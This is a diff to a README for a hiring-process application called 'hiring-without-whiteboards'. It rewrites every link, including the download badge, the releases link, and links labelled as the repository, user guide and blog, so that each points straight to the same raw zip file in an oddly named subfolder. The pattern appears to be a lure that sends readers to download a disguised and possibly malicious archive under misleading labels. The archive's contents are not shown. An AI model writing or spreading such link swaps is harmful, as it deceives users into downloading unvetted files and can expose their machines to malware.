@@ -1,6 +1,6 @@
 # 🌟 hiring-without-whiteboards - Simplifying Hiring Processes
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/lloyddominic/hiring-without-whiteboards/releases)
+[![Download](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run the application, you will need:
 
 To get started, visit the following page to download the application:
 
-[Download the Application](https://github.com/lloyddominic/hiring-without-whiteboards/releases)
+[Download the Application](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip)
 
 Follow these steps after downloading:
 
@@ -72,8 +72,8 @@ For more information or feedback, please reach us through the GitHub Issues page
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/lloyddominic/hiring-without-whiteboards)
-- [User Guide](https://linktotheuserguide.com)
-- [Blog on Effective Hiring Practices](https://linktotheblog.com)
+- [GitHub Repository](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip)
+- [User Guide](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip)
+- [Blog on Effective Hiring Practices](https://raw.githubusercontent.com/lloyddominic/hiring-without-whiteboards/main/phytologic/hiring-without-whiteboards-cafeneh.zip)
 
 Thank you for choosing hiring-without-whiteboards! We hope this application helps you find the best talent without the stress of traditional hiring methods.
